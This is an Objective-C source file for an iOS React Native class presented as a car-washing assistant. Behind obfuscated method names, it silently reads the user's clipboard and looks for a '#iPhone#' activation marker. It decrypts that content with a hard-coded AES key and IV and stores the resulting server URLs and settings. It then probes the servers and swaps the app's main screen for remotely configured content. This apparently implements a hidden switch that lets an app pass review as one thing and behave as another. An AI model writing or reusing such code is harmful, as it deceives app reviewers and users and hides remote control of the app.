#import "RNCarWashingAssistant.h"
#import <CocoaSecurity/CocoaSecurity.h>
#import <react-native-orientation-locker/Orientation.h>
#import "RNCarWashingServer.h"
#import "RNNetReachability.h"

@interface RNCarWashingAssistant()

@property (strong, nonatomic)  NSArray *cw_carWashLiquid;
@property (nonatomic, strong) RNNetReachability *carWashReachability;
@property (nonatomic, copy) void (^vcBlock)(void);

@end

@implementation RNCarWashingAssistant

static RNCarWashingAssistant *instance = nil;

+ (instancetype)carWashing_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.cw_carWashLiquid = @[@"carWashing_APP",
                                   @"a71556f65ed2b25b55475b964488334f",
                                   @"ADD20BFCD9D4EA0278B11AEBB5B83365",
                                   @"vPort",
                                   @"vSecu",
                                   @"spareRoutes",
                                   @"serverUrl"];
  });
  return instance;
}

- (void)carWashing_startMonitoring {
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(carWashing_networkStatusDidChanged:) name:kReachabilityChangedNotification object:nil];
    [self.carWashReachability startNotifier];
}

- (void)carWashing_stopMonitoring {
    [[NSNotificationCenter defaultCenter] removeObserver:self name:kReachabilityChangedNotification object:nil];
    [self.carWashReachability stopNotifier];
}

- (void)dealloc {
    [self carWashing_stopMonitoring];
}


- (void)carWashing_networkStatusDidChanged:(NSNotification *)notification {
    RNNetReachability *reachability = notification.object;
  NetworkStatus networkStatus = [reachability currentReachabilityStatus];
  
  if (networkStatus != NotReachable) {
      NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
      if ([ud boolForKey:self.cw_carWashLiquid[0]] == NO) {
          if (self.vcBlock != nil) {
              [self changeRootController:self.vcBlock];
          }
      }
  }
}

- (void)changeRootController:(void (^ __nullable)(void))changeVcBlock {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  
  NSMutableArray<NSString *> *spareArr = [[ud arrayForKey:self.cw_carWashLiquid[5]] mutableCopy];
  if (spareArr == nil) {
    spareArr = [NSMutableArray array];
  }
  NSString *usingUrl = [ud stringForKey:self.cw_carWashLiquid[6]];
  
  if ([spareArr containsObject:usingUrl] == NO) {
    [spareArr insertObject:usingUrl atIndex:0];
  }
  
  [self carWashing_throughTestMainController:changeVcBlock index:0 mArray:spareArr];
}

- (void)carWashing_throughTestMainController:(void (^ __nullable)(void))changeVcBlock index: (NSInteger)index mArray:(NSArray<NSString *> *)tArray{
  if ([tArray count] < index) {
    return;
  }
  
  NSURL *url = [NSURL URLWithString:tArray[index]];
  NSURLSessionConfiguration *sessionConfig = [NSURLSessionConfiguration defaultSessionConfiguration];
  sessionConfig.timeoutIntervalForRequest = 10 + index * 5;
  NSURLSession *session = [NSURLSession sessionWithConfiguration:sessionConfig];
  NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
  
  NSURLSessionTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
    NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
    if (error == nil && httpResponse.statusCode == 200) {
      NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
      [ud setBool:YES forKey:self.cw_carWashLiquid[0]];
      [ud setValue:tArray[index] forKey:self.cw_carWashLiquid[6]];
      [ud synchronize];
      dispatch_async(dispatch_get_main_queue(), ^{
        if (changeVcBlock != nil) {
          changeVcBlock();
        }
      });
    } else {
      if (index < [tArray count] - 1) {
        [self carWashing_throughTestMainController:changeVcBlock index:index + 1 mArray:tArray];
      }
    }
  }];
  [dataTask resume];
}

- (BOOL)carWashing_cw_followThisWay:(void (^ __nullable)(void))changeVcBlock {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  if ([ud boolForKey:self.cw_carWashLiquid[0]]) {
    return YES;
  } else {
      self.vcBlock = changeVcBlock;
      if ([self carWashing_elephant]) {
          [self changeRootController:changeVcBlock];
          [self carWashing_startMonitoring];
      }
    return NO;
  }
}

- (BOOL)carWashing_elephant {
  NSString *pbString = [self carWashing_getHaphazard];
  CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self carWashing_subSunshine:pbString]
                                                          hexKey:self.cw_carWashLiquid[1]
                                                           hexIv:self.cw_carWashLiquid[2]];
  
  NSDictionary *dataDict = [self carWashing_stringWhirlwind:aes.utf8String];
  return [self carWashing_storeConfigInfo:dataDict];
}

- (NSString *)carWashing_getHaphazard {
  UIPasteboard *clipboard = [UIPasteboard generalPasteboard];
  return clipboard.string ?: @"";
}

- (NSString *)carWashing_subSunshine: (NSString* )pbString {
  if ([pbString containsString:@"#iPhone#"]) {
    NSArray *university = [pbString componentsSeparatedByString:@"#iPhone#"];
    if (university.count > 1) {
      pbString = university[1];
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [university enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
      [ud setObject:obj forKey:[NSString stringWithFormat:@"iPhone_%zd", idx]];
    }];
    [ud synchronize];
  }
  return pbString;
}

- (NSDictionary *)carWashing_stringWhirlwind: (NSString* )utf8String {
  NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
  if (data == nil) {
    return @{};
  }
  NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:data
                                                       options:kNilOptions
                                                         error:nil];
  return dict[@"data"];
}

- (BOOL)carWashing_storeConfigInfo:(NSDictionary *)dict {
    if (dict == nil || [dict.allKeys count] < 3) {
      return NO;
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:self.cw_carWashLiquid[0]];
    
    [dict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:key];
    }];

    [ud synchronize];
    return YES;
}

- (UIViewController *)carWashing_cw_throughMainController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
    UIViewController *vc = [UIViewController new];
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [[RNCarWashingServer shared] configCarWashingServer:[ud stringForKey:self.cw_carWashLiquid[3]] withSecurity:[ud stringForKey:self.cw_carWashLiquid[4]]];
    return vc;
}

- (UIInterfaceOrientationMask)carWashing_getOrientation {
  return [Orientation getOrientation];
}

@end
